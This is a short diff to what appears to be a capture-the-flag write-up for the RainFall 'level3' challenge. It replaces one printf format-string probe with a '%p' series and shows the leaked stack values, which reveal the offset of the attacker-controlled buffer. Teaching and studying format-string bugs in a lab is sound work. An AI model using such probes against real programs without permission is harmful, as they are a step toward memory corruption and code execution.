@@ -93,8 +93,8 @@ Direct parameter access: You can access specific parameters in the stack with sy
 One of the critical issues here was this. In which argument of printf we will perform this operation.
 
 ```
-level3@RainFall:~$ echo "AAAA %1\$x %2\$x %3\$x %4\$x %5\$x" | ./level3
-AAAA200b7fd1ac0b7ff37d04141414178243125
+level3@RainFall:~$ echo "AAAA %p %p %p %p %p %p %p %p" | ./level3
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
 ```
 
 ```
